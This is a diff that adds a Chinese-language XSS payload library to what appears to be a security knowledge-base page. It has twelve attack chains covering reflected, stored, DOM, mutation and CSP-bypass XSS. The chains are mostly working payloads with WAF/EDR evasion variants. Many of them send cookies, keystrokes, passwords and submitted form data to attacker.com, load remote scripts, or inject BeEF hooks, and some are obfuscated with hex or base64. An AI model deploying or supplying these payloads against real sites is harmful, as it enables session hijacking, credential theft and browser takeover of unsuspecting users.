@@ -340,3 +340,807 @@ _共 335 份 HackerOne 已披露 High/Critical 报告命中本类，按 (赏金 
 - Reflected XSS：1 条
 - Improper Neutralization of HTTP Headers for Scripting Syntax：1 条
 - Cross-Site Scripting (XSS)：1 条
+
+
+## Payload 库
+
+_12 个结构化 web payload，含完整攻击链 + WAF/EDR 绕过变体_
+
+### 反射型XSS  `xss-reflected`
+反射型跨站脚本攻击技术
+子类：**反射型** · tags: `xss` `reflected` `javascript`
+
+**前置条件：** 存在用户输入反射到页面；输入未经过滤或编码
+
+**攻击链：**
+
+**1. 1. 探测XSS注入点**
+_基础XSS探测_
+```
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+" onfocus=alert(1) autofocus "
+```
+
+**2. 2. 事件处理器绕过**
+_使用各种事件处理器_
+```
+<img src=x onerror=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+```
+
+**3. 3. 标签绕过**
+_大小写混淆和标签变形_
+```
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x OnErRoR=alert(1)>
+<svg/onload=alert(1)>
+<details/open/ontoggle=alert(1)>
+```
+
+**4. 4. 窃取Cookie**
+_窃取用户Cookie_
+```
+<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
+<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
+<script>location="http://attacker.com/steal?c="+document.cookie</script>
+```
+
+**5. 5. 键盘记录**
+_记录用户键盘输入_
+```
+<script>
+document.onkeypress=function(e){
+  fetch("http://attacker.com/log?key="+e.key)
+}
+</script>
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. HTML实体编码**
+_使用HTML实体编码绕过_
+```
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+```
+
+**2. Unicode编码**
+_使用Unicode编码绕过_
+```
+<script>\u0061lert(1)</script>
+<img src=x onerror=\u0061lert(1)>
+```
+
+**3. 双写绕过**
+_双写绕过关键字删除_
+```
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<imimgg src=x onerror=alert(1)>
+```
+
+**4. 注释混淆**
+_使用注释混淆_
+```
+<script>/**/alert(1)/**/</script>
+<img src=x/**/onerror=alert(1)>
+<svg on<!--test-->load=alert(1)>
+```
+
+---
+
+### 存储型XSS  `xss-stored`
+存储型跨站脚本攻击技术
+子类：**存储型** · tags: `xss` `stored` `persistent`
+
+**前置条件：** 存在数据存储功能；存储数据未经过滤显示
+
+**攻击链：**
+
+**1. 1. 探测存储点**
+_探测存储型XSS_
+```
+在评论区、用户名、个人简介等处输入:
+<script>alert(1)</script>
+"><script>alert(1)</script>
+测试是否存储并执行
+```
+
+**2. 2. 隐蔽Payload**
+_使用隐蔽的XSS payload_
+```
+<img src=x onerror=alert(1) style="display:none">
+<svg/onload=alert(1) style="position:absolute;left:-9999px">
+<div style="background:url(javascript:alert(1))">
+```
+
+**3. 3. 持久化控制**
+_加载外部恶意脚本_
+```
+<script>
+if(!window.xss_loaded){
+  window.xss_loaded=true;
+  var s=document.createElement("script");
+  s.src="http://attacker.com/evil.js";
+  document.body.appendChild(s);
+}
+</script>
+```
+
+**4. 4. BeEF Hook**
+_使用BeEF框架控制浏览器_
+```
+<script src="http://beef-server:3000/hook.js"></script>
+或:
+<script>
+var s=document.createElement("script");
+s.src="http://beef-server:3000/hook.js";
+document.body.appendChild(s);
+</script>
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. SVG标签绕过**
+_使用SVG标签绕过_
+```
+<svg><script>alert(1)</script></svg>
+<svg><animate onbegin=alert(1)>
+<svg><set onbegin=alert(1)>
+```
+
+**2. Math标签绕过**
+_使用MathML标签_
+```
+<math><maction actiontype="statusline#http://attacker.com" xlink:href="javascript:alert(1)">click</maction></math>
+```
+
+---
+
+### DOM型XSS  `xss-dom`
+基于DOM的跨站脚本攻击
+子类：**DOM型** · tags: `xss` `dom` `javascript`
+
+**前置条件：** 存在JavaScript动态操作DOM；用户输入直接写入DOM
+
+**攻击链：**
+
+**1. 1. 探测DOM XSS**
+_探测DOM型XSS_
+```
+#<script>alert(1)</script>
+?param=<img src=x onerror=alert(1)>
+检查location.hash、location.search等是否直接写入DOM
+```
+
+**2. 2. 常见Sink点**
+_常见的DOM XSS Sink点_
+```
+document.write(location.hash)
+innerHTML = location.search
+eval(location.hash)
+setTimeout(location.hash, 0)
+jQuery(html)
+$(location.hash)
+```
+
+**3. 3. location.hash利用**
+_利用location.hash_
+```
+URL: http://target.com/#<img src=x onerror=alert(1)>
+如果页面有: document.write(location.hash)
+则触发XSS
+```
+
+**4. 4. postMessage利用**
+_利用postMessage_
+```
+window.addEventListener("message", function(e){
+  document.getElementById("output").innerHTML = e.data;
+});
+攻击页面:
+targetWindow.postMessage("<img src=x onerror=alert(1)>", "*");
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. javascript:协议变体绕过**
+_使用大小写混淆、HTML实体编码、制表符插入等方式绕过javascript:协议过滤_
+```
+javascript:alert(1)
+javascript	:alert(1)
+jaVaScRiPt:alert(1)
+&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)
+<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;:alert(1)">click</a>
+```
+
+**2. SVG/MathML标签与事件处理器绕过**
+_利用SVG、MathML等非标准HTML标签及冷门事件处理器(ontoggle、onpageshow)绕过标签和事件黑名单_
+```
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
+<details open ontoggle=alert(1)>
+<body onpageshow=alert(1)>
+<input onfocus=alert(1) autofocus>
+```
+
+---
+
+### CSP绕过  `xss-csp-bypass`
+绕过内容安全策略(CSP)的XSS技术
+子类：**CSP绕过** · tags: `xss` `csp` `bypass`
+
+**前置条件：** 存在XSS漏洞；存在CSP策略但配置不当
+
+**攻击链：**
+
+**1. 1. 分析CSP策略**
+_分析CSP配置_
+```
+查看HTTP响应头:
+Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
+或使用CSP Evaluator工具分析
+```
+
+**2. 2. 利用unsafe-inline**
+_利用unsafe-inline配置_
+```
+如果CSP包含unsafe-inline:
+<script>alert(1)</script>
+可以直接执行内联脚本
+```
+
+**3. 3. 利用unsafe-eval**
+_利用unsafe-eval配置_
+```
+如果CSP包含unsafe-eval:
+<script>eval("alert(1)")</script>
+<script>setTimeout("alert(1)", 0)</script>
+可以使用eval等函数
+```
+
+**4. 4. JSONP绕过**
+_利用JSONP绕过_
+```
+如果允许的域名有JSONP端点:
+<script src="https://allowed-domain.com/jsonp?callback=alert(1)"></script>
+利用JSONP回调执行代码
+```
+
+**5. 5. AngularJS绕过**
+_利用AngularJS绕过CSP_
+```
+如果允许了AngularJS CDN:
+<div ng-app ng-csp>
+<div ng-focus="$event.path|orderBy:'[].constructor.from([alert(1)])'" tabindex=0>
+</div>
+</div>
+```
+
+**6. 6. Dangling Markup**
+_利用悬挂标记窃取数据_
+```
+<img src='http://attacker.com/?
+捕获后续HTML内容直到遇到单引号
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. JSONP端点劫持CSP**
+_利用CSP白名单域上的JSONP回调端点或AngularJS库执行任意JavaScript，无需unsafe-inline_
+```
+# 寻找白名单域上的JSONP端点:
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.min.js"></script>
+<div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}</div>
+```
+
+**2. base-uri劫持与script nonce泄露**
+_利用CSP未限制base-uri指令劫持脚本加载源，或通过CSS注入/DOM接口泄露script nonce值_
+```
+# base-uri未限制时:
+<base href="http://attacker.com/">
+# 页面中相对路径的脚本将从attacker.com加载
+
+# nonce泄露利用:
+# 通过CSS注入窃取nonce:
+<style>script[nonce^="a"]{background:url(http://attacker.com/?n=a)}</style>
+# 或通过DOM读取: document.querySelector("script[nonce]").nonce
+```
+
+---
+
+### 突变型XSS(mXSS)  `xss-mxss`
+利用浏览器解析差异导致的XSS攻击
+子类：**突变型** · tags: `xss` `mxss` `mutation` `bypass`
+
+**前置条件：** 存在HTML输出点；浏览器解析差异
+
+**攻击链：**
+
+**1. 1. 基础mXSS探测**
+_利用noscript标签解析差异_
+```
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+```
+
+**2. 2. SVG mXSS**
+_SVG CDATA突变_
+```
+<svg><![CDATA[<img src=x onerror=alert(1)>]]></svg>
+<svg><script><![CDATA[alert(1)]]></script></svg>
+```
+
+**3. 3. Math mXSS**
+_MathML突变XSS_
+```
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+```
+
+**4. 4. DOM clobbering配合**
+_利用DOM clobbering_
+```
+<form id=x></form><form id=x><img src=x onerror=alert(1)></form>
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. 嵌套标签绕过**
+_SVG内脚本编码绕过_
+```
+<svg><script>&#97;lert(1)</script></svg>
+<svg><script>a&#108;ert(1)</script></svg>
+```
+
+---
+
+### Unicode XSS  `xss-unicode`
+利用Unicode编码特性绕过过滤
+子类：**Unicode编码** · tags: `xss` `unicode` `encoding` `bypass`
+
+**前置条件：** 存在XSS注入点；过滤器检查关键字
+
+**攻击链：**
+
+**1. 1. Unicode转义**
+_JavaScript Unicode转义_
+```
+<script>\u0061lert(1)</script>
+<script>\x61lert(1)</script>
+<script>\u{61}lert(1)</script>
+```
+
+**2. 2. HTML实体编码**
+_HTML十进制/十六进制实体_
+```
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>
+```
+
+**3. 3. Unicode规范化攻击**
+_利用Unicode规范化_
+```
+使用规范化等效字符:
+＜script＞alert(1)＜/script＞
+使用全角字符绕过
+```
+
+**4. 4. UTF-7编码**
+_UTF-7编码XSS_
+```
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
+需要页面使用UTF-7编码
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. 混合编码绕过**
+_混合多种编码方式_
+```
+<img src=x onerror=\u0061&#108;ert(1)>
+<img src=x onerror="\u0061lert`1`">
+```
+
+**2. 过长UTF-8编码**
+_利用服务器UTF-8解析差异_
+```
+<img src=x onerror=alert(1)>
+使用非最短UTF-8编码形式
+```
+
+---
+
+### XSS过滤器绕过  `xss-filter-bypass`
+各种绕过XSS过滤器的技术
+子类：**过滤器绕过** · tags: `xss` `filter` `bypass` `waf`
+
+**前置条件：** 存在XSS注入点；存在过滤机制
+
+**攻击链：**
+
+**1. 1. 大小写混淆**
+_混合大小写绕过_
+```
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x OnErRoR=alert(1)>
+<SvG OnLoAd=alert(1)>
+```
+
+**2. 2. 双写绕过**
+_双写绕过关键字删除_
+```
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<imimgg src=x onerror=alert(1)>
+```
+
+**3. 3. 注释混淆**
+_使用注释混淆_
+```
+<script>/**/alert(1)/**/</script>
+<img src=x/**/onerror=alert(1)>
+<svg on<!--test-->load=alert(1)>
+```
+
+**4. 4. 空字节截断**
+_空字节截断绕过_
+```
+<scr\x00ipt>alert(1)</script>
+<img src=x onerror=alert\x00(1)>
+```
+
+**5. 5. 标签属性绕过**
+_利用空白字符绕过_
+```
+<img src=x onerror=alert(1)>
+<img src=x onerror =alert(1)>
+<img src=x onerror	=alert(1)>
+<img src=x onerror
+=alert(1)>
+```
+
+**6. 6. 事件处理器变体**
+_使用少见的事件处理器_
+```
+<body onpageshow=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video><source onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<audio src=x onerror=alert(1)>
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. Data URI绕过**
+_使用Data URI_
+```
+<a href="data:text/html,<script>alert(1)</script>">click</a>
+<iframe src="data:text/html,<script>alert(1)</script>">
+```
+
+**2. SVG动画绕过**
+_SVG动画事件_
+```
+<svg><animate onbegin=alert(1)>
+<svg><set onbegin=alert(1)>
+```
+
+---
+
+### XSS编码绕过  `xss-encoding`
+利用各种编码技术绕过XSS过滤
+子类：**编码绕过** · tags: `xss` `encoding` `bypass`
+
+**前置条件：** 存在XSS注入点；存在编码处理
+
+**攻击链：**
+
+**1. 1. URL编码**
+_URL编码绕过_
+```
+<img src=x onerror=%61lert(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
+```
+
+**2. 2. HTML实体编码**
+_HTML实体编码_
+```
+<img src=x onerror=&#97;lert(1)>
+<img src=x onerror=&#x61;lert(1)>
+&lt;script&gt;alert(1)&lt;/script&gt;
+```
+
+**3. 3. JavaScript编码**
+_JavaScript编码_
+```
+<img src=x onerror="\u0061lert(1)">
+<img src=x onerror="\x61lert(1)">
+<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
+```
+
+**4. 4. CSS编码**
+_CSS编码（旧版IE）_
+```
+<style>body{background:url("javascript:alert(1)")}</style>
+<div style="x:expression(alert(1))">
+```
+
+**5. 5. 混合编码**
+_混合多种编码_
+```
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">click</a>
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. 双重URL编码**
+_双重URL编码_
+```
+%253Cscript%253Ealert(1)%253C/script%253E
+服务器解码两次时使用
+```
+
+**2. UTF-16编码**
+_UTF-16编码绕过_
+```
+%00%3C%00s%00c%00r%00i%00p%00t%00%3Ealert(1)%00%3C/s%00c%00r%00i%00p%00t%00%3E
+```
+
+---
+
+### Polyglot XSS  `xss-polyglot`
+多环境通用的XSS payload
+子类：**Polyglot** · tags: `xss` `polyglot` `universal`
+
+**前置条件：** 存在XSS注入点；不确定具体环境
+
+**攻击链：**
+
+**1. 1. 经典Polyglot**
+_经典多环境Polyglot_
+```
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+
+**2. 2. 短Polyglot**
+_短版本Polyglot_
+```
+'"-->]]>*/</script></style></title></textarea><script>alert(1)</script>
+```
+
+**3. 3. 属性注入Polyglot**
+_属性值注入Polyglot_
+```
+'onmouseover=alert(1) x='
+"onfocus=alert(1) autofocus x="
+'onclick=alert(1)//
+```
+
+**4. 4. URL参数Polyglot**
+_URL参数Polyglot_
+```
+javascript:alert(1)//http://
+data:text/html,<script>alert(1)</script>
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. 高级Polyglot**
+_简洁高效Polyglot_
+```
+-->'"<svg onload=alert(1)>"><script>alert(1)</script>
+```
+
+---
+
+### XSS Cookie窃取  `xss-cookie-theft`
+利用XSS窃取用户Cookie
+子类：**Cookie窃取** · tags: `xss` `cookie` `theft` `session`
+
+**前置条件：** 存在XSS漏洞；Cookie未设置HttpOnly
+
+**攻击链：**
+
+**1. 1. 基础Cookie窃取**
+_使用Image对象发送Cookie_
+```
+<script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
+```
+
+**2. 2. Fetch API窃取**
+_使用Fetch/Beacon API_
+```
+<script>fetch("http://attacker.com/steal?c="+document.cookie)</script>
+<script>navigator.sendBeacon("http://attacker.com/steal", document.cookie)</script>
+```
+
+**3. 3. XMLHttpRequest窃取**
+_使用XHR发送_
+```
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://attacker.com/steal?c="+document.cookie, true);
+xhr.send();
+</script>
+```
+
+**4. 4. 编码传输**
+_Base64编码传输_
+```
+<script>
+var data = btoa(document.cookie);
+new Image().src="http://attacker.com/steal?c="+data;
+</script>
+```
+
+**5. 5. 完整利用脚本**
+_收集完整信息_
+```
+<script>
+var img = new Image();
+img.src = "http://attacker.com/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
+</script>
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. 混淆绕过**
+_变量混淆绕过_
+```
+<script>var _0x1234="cookie";eval("new Image().src=\"http://attacker.com/?c="+document[_0x1234]+"\"")</script>
+```
+
+---
+
+### XSS键盘记录  `xss-keylogger`
+利用XSS记录用户键盘输入
+子类：**键盘记录** · tags: `xss` `keylogger` `credential`
+
+**前置条件：** 存在存储型XSS；目标页面有敏感输入
+
+**攻击链：**
+
+**1. 1. 基础键盘记录**
+_监听键盘按键_
+```
+<script>
+document.addEventListener("keypress", function(e){
+  new Image().src = "http://attacker.com/log?key=" + e.key;
+});
+</script>
+```
+
+**2. 2. 完整键盘记录**
+_按Enter发送记录_
+```
+<script>
+var buffer = "";
+document.addEventListener("keydown", function(e){
+  if(e.key === "Enter"){
+    new Image().src = "http://attacker.com/log?data=" + encodeURIComponent(buffer);
+    buffer = "";
+  } else {
+    buffer += e.key;
+  }
+});
+</script>
+```
+
+**3. 3. 表单窃取**
+_窃取密码字段_
+```
+<script>
+document.querySelectorAll("input[type=password]").forEach(function(input){
+  input.addEventListener("change", function(){
+    new Image().src = "http://attacker.com/log?pwd=" + this.value;
+  });
+});
+</script>
+```
+
+**4. 4. 表单提交劫持**
+_劫持表单提交_
+```
+<script>
+document.querySelectorAll("form").forEach(function(form){
+  form.addEventListener("submit", function(e){
+    var data = new FormData(this);
+    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();
+  });
+});
+</script>
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. 混淆版本**
+_十六进制混淆_
+```
+<script>var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})</script>
+```
+
+---
+
+### BeEF框架利用  `xss-beef`
+使用BeEF框架进行XSS利用
+子类：**BeEF利用** · tags: `xss` `beef` `framework` `exploitation`
+
+**前置条件：** 存在XSS漏洞；部署BeEF服务器
+
+**攻击链：**
+
+**1. 1. 部署BeEF**  _[linux]_
+_部署BeEF服务器_
+```
+# 安装BeEF
+git clone https://github.com/beefproject/beef
+cd beef
+bundle install
+./beef
+
+# 默认运行在 http://localhost:3000
+# 默认用户名: beef
+# 默认密码: beef
+```
+
+**2. 2. 注入Hook脚本**
+_注入BeEF Hook_
+```
+<script src="http://attacker.com:3000/hook.js"></script>
+注入短版本:
+<script src="//attacker.com:3000/hook.js"></script>
+```
+
+**3. 3. 常用命令**
+_BeEF控制台命令_
+```
+# BeEF控制台常用命令
+# 查看在线僵尸
+beef> online_browsers
+
+# 执行命令
+beef> run social_engineering fake_notification
+
+# 获取Cookie
+beef> run browser get_cookies
+
+# 重定向页面
+beef> run browser redirect https://evil.com
+```
+
+**4. 4. 模块利用**
+_BeEF模块列表_
+```
+# 常用模块
+# 社会工程学
+- Fake Notification
+- Fake Flash Update
+- Pretty Theft
+
+# 浏览器攻击
+- Get Cookie
+- Redirect Browser
+- TabNabbing
+
+# 网络攻击
+- DNS Spoofing
+- Ping Sweep
+- Port Scanner
+```
+
+**WAF/EDR 绕过变体：**
+
+**1. 混淆Hook URL**
+_Base64混淆Hook注入_
+```
+<script>eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))</script>
+```
+
+---
